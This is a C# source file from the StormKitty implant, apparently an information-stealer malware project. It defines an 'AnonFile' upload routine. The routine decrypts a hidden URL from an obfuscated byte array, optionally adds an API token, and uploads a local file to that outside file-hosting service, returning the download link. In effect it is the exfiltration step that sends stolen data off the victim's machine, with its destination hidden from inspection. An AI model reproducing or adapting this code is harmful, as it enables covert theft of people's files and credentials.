using StormKitty.Implant;
using System;
using System.Net;
using System.Text;

namespace StormKitty
{
    internal sealed class AnonFile
    {
        public static string Upload(string file, bool api = false)
        {
            try
            {
                using (WebClient Client = new WebClient())
                {
                    byte[] Response = Client.UploadFile(
                        StringsCrypt.Decrypt(new byte[] { 1, 203, 201, 210, 147, 242, 36, 225, 66, 42, 36, 218, 27, 178, 235, 223, 170, 114, 211, 210, 237, 234, 99, 134, 41, 195, 235, 18, 139, 139, 53, 239, 207, 253, 34, 1, 192, 176, 118, 47, 164, 23, 131, 62, 62, 37, 108, 32, }) +
                        (api ? StringsCrypt.AnonApiToken : ""), file);
                    string ResponseBody = Encoding.ASCII.GetString(Response);
                    if (!ResponseBody.Contains("\"error\": {"))
                        return ResponseBody.Split('"')[15];
                    else
                        Console.WriteLine(ResponseBody);
                }
            }
            catch (Exception error)
            {
                Console.WriteLine(error);
            }
            return null;
        }
    }
}
